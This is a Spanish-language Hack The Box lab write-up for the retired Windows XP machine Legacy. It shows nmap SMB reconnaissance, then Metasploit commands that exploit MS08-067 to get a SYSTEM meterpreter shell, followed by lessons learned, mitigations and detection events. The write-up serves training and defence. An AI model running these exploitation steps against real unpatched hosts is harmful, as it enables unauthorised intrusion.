---
machine: Legacy
os: Windows
difficulty: Easy
platform: Hack The Box
category: Windows / SMB
state: Retired
tags: [windows, smb, ms08-067, netapi, metasploit]
---

# Legacy — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Windows XP con SMBv1 y sólo 139/445 abiertos: **MS08-067** (`netapi32.dll`) da ejecución remota como SYSTEM. Es la máquina más corta de la plataforma y sirve para entender el reconocimiento de SMB y el uso de un módulo de Metasploit.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

```bash
nmap --script smb-os-discovery,smb-security-mode -p445 <IP>
nmap --script vuln -p445 <IP>
```

`smb-os-discovery` devuelve `Windows XP` y `message_signing: disabled`; el script de vulnerabilidades marca `MS08-067`.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
msfconsole -q
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS <IP>
msf6 > set LHOST <IP>
msf6 > set RPORT 445
msf6 > run
```

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```text
meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

Las flags están en los escritorios de `john` y `Administrator`; el compromiso es inmediato, sin escalada.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **SMBv1 deshabilitado en el cliente**: usar `smbclient`/Metasploit desde una VM con SMBv1 activo o forzar la negociación.
- **`RPORT`**: el módulo debe apuntar al 445, no al 139.
- **Reintentos**: contra una VPN lenta el exploit falla a la primera; repetir con `setg ExitOnSession false`.

- MS08-067 es ejecución remota sin credenciales en sistemas sin parchear: el escaneo de vulnerabilidades lo confirma antes de atacar.
- Un servicio que corre como SYSTEM no necesita escalada.
- Mitigación: deshabilitar SMBv1, parchear y segmentar la red.

## Mitigaciones y detección

- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [rop-stack](../../../knowledge/pwn/rop-stack.md)
